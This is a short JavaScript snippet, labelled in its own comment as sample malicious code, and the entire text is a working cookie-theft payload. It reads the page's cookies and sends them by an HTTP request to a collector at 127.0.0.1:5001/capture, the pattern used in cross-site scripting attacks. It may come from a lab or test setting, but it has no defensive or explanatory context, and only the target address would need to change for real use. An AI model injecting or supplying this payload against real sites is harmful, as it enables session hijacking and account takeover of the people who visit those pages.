// This is a sample malicious JavaScript code
var cookies = document.cookie;
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://127.0.0.1:5001/capture?cookie=" + encodeURIComponent(cookies), true);
xhr.send();
